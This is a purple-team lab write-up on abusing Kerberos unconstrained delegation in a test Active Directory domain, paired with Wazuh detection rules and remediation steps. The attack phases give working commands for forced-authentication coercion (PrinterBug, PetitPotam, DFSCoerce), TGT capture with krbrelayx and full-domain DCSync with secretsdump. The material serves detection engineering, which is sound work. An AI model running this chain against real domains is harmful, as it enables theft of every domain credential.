# Lab 16 — Kerberos Unconstrained Delegation & PrinterBug Coercion

*Part of the [Kerberos Attacks and Defense Labs](../README.md) — an advanced purple-team investigation: Active Directory machine account internals (`WIN-SOCLAB$` vs `FAKE-SRV$`), Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`), Print Spooler RPC coercion (`PrinterBug` / `DFSCoerce` / `PetitPotam`), intercepting Domain Controller TGTs via `krbrelayx.py`, full-domain DRSUAPI credential dumping (`secretsdump`), and Wazuh SIEM detection engineering (Rules 100130 & 100131).*

---

## 💡 Conceptual Foundation: Machine Accounts (`$`) & Unconstrained Delegation

In Active Directory, **every domain-joined server and workstation has its own account** ending with `$` (e.g., `WIN-SOCLAB$`). When a server boots—before any human logs in—it uses its machine account and Kerberos TGT to authenticate on the network and pull Group Policy. Because `WIN-SOCLAB` is the **Domain Controller**, `WIN-SOCLAB$` holds **full DRSUAPI (DCSync) replication privileges** over the entire domain.

With **Unconstrained Delegation** (`TrustedForDelegation = $true`), any user or machine that authenticates to a delegated server has its **entire Kerberos TGT** embedded and cached in that server's `lsass.exe` memory. By coercing `WIN-SOCLAB$` to authenticate to an attacker-controlled delegated host (`FAKE-SRV$` pointing to Kali `192.168.100.50`), the attacker captures the DC's own TGT and dumps the entire domain without needing any admin password.

```text
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                      UNCONSTRAINED DELEGATION & COERCION KILL CHAIN                                    │
├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                        │
│  [ Phase 1: Delegation Misconfiguration ]                                                              │
│  Delegated Host (FAKE-SRV$) has TrustedForDelegation = $true & cifs/ SPN                               │
│       │                                                                                                │
│       └─► Event ID 4742 (UAC: %%2093) [Wazuh Rule 100130: Level 12 Alert]                              │
│                                                                                                        │
│  [ Phase 2: Coercion via Normal User (alexrivera) ]                                                    │
│  Kali (192.168.100.50): nxc smb 192.168.100.146 -u alexrivera -M coerce_plus -o LISTENER=...           │
│       │                                                                                                │
│       └─► WIN-SOCLAB$ connects back to Kali (krbrelayx.py) & sends its DC Machine TGT                  │
│                                                                                                        │
│  [ Phase 3: Full Domain Compromise (DCSync) ]                                                          │
│  export KRB5CCNAME='WIN-SOCLAB$@SOCLAB.LOCAL_krbtgt@SOCLAB.LOCAL.ccache'                               │
│  impacket-secretsdump -k -no-pass WIN-SOCLAB.SOCLAB.LOCAL -just-dc                                     │
│       │                                                                                                │
│       ├─► Event ID 4624 (WIN-SOCLAB$ from 192.168.100.50) [Wazuh Rule 100131: Level 12 Alert]          │
│       └─► Event ID 4662 (DS-Replication-Get-Changes-All)  [Wazuh Rule 100123: Level 13 Alert]          │
│                                                                                                        │
└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Phase 1: Target Setup & Delegation Misconfiguration (`WIN-SOCLAB`)

1. Ensure the Windows **Print Spooler** (`spoolsv.exe`) service is running on `WIN-SOCLAB`:
```powershell
Start-Service Spooler
Get-Service Spooler
```

![Screenshot 1](images/Screenshot_1.png)

2. Provision the delegated computer account (`FAKE-SRV$`) with `TrustedForDelegation $true`, a decryption password, and a `cifs/` SPN:
```powershell
New-ADComputer -Name "FAKE-SRV" -SamAccountName "FAKE-SRV$" -DNSHostName "FAKE-SRV.soclab.local"
Set-ADComputer -Identity "FAKE-SRV" -TrustedForDelegation $true
Set-ADAccountPassword -Identity "FAKE-SRV$" -Reset -NewPassword (ConvertTo-SecureString "<REDACTED_PASSWORD>" -AsPlainText -Force)
Set-ADComputer -Identity "FAKE-SRV" -ServicePrincipalNames @{Add="cifs/FAKE-SRV.soclab.local"}
```

![Screenshot 2](images/Screenshot_2.png)

3. Map `FAKE-SRV.soclab.local` to the Kali listener (`192.168.100.50`) in DNS and `hosts`, then verify port 445 connectivity:
```powershell
Add-DnsServerResourceRecordA -Name "FAKE-SRV" -ZoneName "soclab.local" -IPv4Address "192.168.100.50"
```

![Screenshot 3](images/Screenshot_3.png)

```powershell
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`r`n192.168.100.50 FAKE-SRV.soclab.local"
ipconfig /flushdns
Test-NetConnection -ComputerName FAKE-SRV.soclab.local -Port 445
```

![Screenshot 12](images/Screenshot_12.png)

---

## ⚡ Phase 2: Coercion & DC TGT Capture (`Kali Linux`)

1. Clone `krbrelayx`, derive the MD4 NTLM hash for `FAKE-SRV$`, and start the `krbrelayx.py` listener:
```bash
git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx
sudo python3 /opt/krbrelayx/krbrelayx.py -hashes :<REDACTED_MACHINE_NT_HASH>
```

![Screenshot 4](images/Screenshot_4.png)

2. Trigger RPC coercion (`DFSCoerce`, `PetitPotam`, `PrinterBug`) from Kali using the unprivileged domain user `alexrivera`:
```bash
nxc smb 192.168.100.146 -u alexrivera -p '<REDACTED_PASSWORD>' -M coerce_plus -o LISTENER=FAKE-SRV.soclab.local
```

![Screenshot 5](images/Screenshot_5.png)

---

## 👑 Phase 3: DCSync & Post-Exploitation (`Kali Linux`)

1. Export the captured `WIN-SOCLAB$` TGT and run full-domain DCSync (`impacket-secretsdump -k -no-pass`):
```bash
export KRB5CCNAME='WIN-SOCLAB$@SOCLAB.LOCAL_krbtgt@SOCLAB.LOCAL.ccache'
impacket-secretsdump -k -no-pass WIN-SOCLAB.SOCLAB.LOCAL -just-dc
```

![Screenshot 16](images/Screenshot_16.png)

![Screenshot 22](images/Screenshot_22.png)

2. Lateral movement testing & key-type validation:
- Passing an AES128 key into `-hashes` triggers `STATUS_LOGON_FAILURE` (Event 4625 / Rule 100116):

![Screenshot 17](images/Screenshot_17.png)

- Authenticating with `alexrivera`'s valid NTLM hash via `impacket-smbclient` enumerates `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`:
```bash
impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.146
```

![Screenshot 18](images/Screenshot_18.png)

---

## 🛡️ Phase 4: Blue Team Telemetry & Custom Wazuh Rules (`100130` & `100131`)

### 1. Observed Coercion & DCSync Telemetry

- **Rule 100115 (Event 4624):** Off-hours network logon during `nxc` coercion:

![Screenshot 6](images/Screenshot_6.png)

![Screenshot 7](images/Screenshot_7.png)

- **Rule 100117 (Event 4768) & Rule 100102 (Event 4769 RC4):** Kerberos TGT/TGS requests triggered during coercion:

![Screenshot 8](images/Screenshot_8.png)

![Screenshot 9](images/Screenshot_9.png)

- **Event 4662 / Rule 100123 (Level 13):** Directory Service Replication (`DS-Replication-Get-Changes-All`) triggered by `WIN-SOCLAB$` from `192.168.100.50`:

![Screenshot 10](images/Screenshot_10.png)

![Screenshot 11](images/Screenshot_11.png)

![Screenshot 13](images/Screenshot_13.png)

![Screenshot 14](images/Screenshot_14.png)

![Screenshot 15](images/Screenshot_15.png)

- **Rules 100114, 100116, and 100117:** Normal user SMB logon (`alexrivera`), failed logon (`STATUS_LOGON_FAILURE`), and TGT request:

![Screenshot 19](images/Screenshot_19.png)

![Screenshot 20](images/Screenshot_20.png)

![Screenshot 21](images/Screenshot_21.png)

---

### 2. Custom Wazuh Rules Deployed (`100130` & `100131`)

```xml
<!-- Rule 100130: Computer Account Modified with Unconstrained Delegation (Event 4742) -->
<rule id="100130" level="12">
  <if_sid>60121</if_sid>
  <field name="win.system.eventID">^4742$</field>
  <field name="win.eventdata.userAccountControl" type="pcre2">2093</field>
  <description>CRITICAL: Computer Account Configured with Unconstrained Delegation (T1558)</description>
  <mitre>
    <id>T1558</id>
  </mitre>
  <group>kerberos_delegation,privilege_escalation,</group>
</rule>

<!-- Rule 100131: DC Machine Account Authenticating from Non-DC IP -->
<rule id="100131" level="12">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4624$</field>
  <field name="win.eventdata.targetUserName">^WIN-SOCLAB\$$</field>
  <field name="win.eventdata.ipAddress" type="pcre2" negate="yes">^(192\.168\.100\.146|127\.0\.0\.1|::1|-)$</field>
  <description>CRITICAL: Domain Controller Machine Account (WIN-SOCLAB$) Logged On from External/Non-DC IP (Possible Delegation Abuse)</description>
  <mitre>
    <id>T1558</id>
  </mitre>
  <group>kerberos_delegation,lateral_movement,</group>
</rule>
```

#### Live Verification: Rule 100131 (`WIN-SOCLAB$` Non-DC IP Logon)

![Screenshot 25](images/Screenshot_25.png)

![Screenshot 26](images/Screenshot_26.png)

![Screenshot 27](images/Screenshot_27.png)

![Screenshot 28](images/Screenshot_28.png)

#### Live Verification: Event 4742 & Rule 100130 (`%%2093` — Trusted For Delegation Enabled)

![Screenshot 23](images/Screenshot_23.png)

![Screenshot 24](images/Screenshot_24.png)

![Screenshot 29](images/Screenshot_29.png)

![Screenshot 30](images/Screenshot_30.png)

![Screenshot 31](images/Screenshot_31.png)

![Screenshot 32](images/Screenshot_32.png)

![Screenshot 33](images/Screenshot_33.png)

![Screenshot 34](images/Screenshot_34.png)

![Screenshot 35](images/Screenshot_35.png)

![Screenshot 36](images/Screenshot_36.png)

![Screenshot 37](images/Screenshot_37.png)

![Screenshot 38](images/Screenshot_38.png)

---

## 🔒 Defensive Remediation

1. **Disable Unconstrained Delegation:** Never enable `TrustedForDelegation` on member servers; migrate to Constrained Delegation or RBCD.
2. **Disable Print Spooler on Domain Controllers:** `Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled`.
3. **Add Sensitive Accounts to `Protected Users`:** Prevents TGT delegation and NTLM caching.
4. **Full Forest Recovery (If Compromised):** Reset `krbtgt` **twice** (10–24 hours apart), rotate all user/service/machine passwords, and purge unauthorized ACLs.
